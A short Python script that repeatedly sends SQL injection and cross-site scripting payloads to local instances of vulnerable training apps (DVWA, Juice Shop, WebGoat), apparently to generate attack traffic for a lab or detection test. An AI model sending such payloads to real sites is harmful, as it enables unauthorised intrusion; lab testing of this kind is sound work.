import requests
import time

ATTACKS = [
    "/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit",
    "/juice/#/search?q=<script>alert(1)</script>",
    "/webgoat/SqlInjection/attack?username=admin'--"
]

BASE = "http://localhost"

while True:
    for attack in ATTACKS:
        try:
            requests.get(BASE + attack, timeout=5)
        except:
            pass
        time.sleep(2)
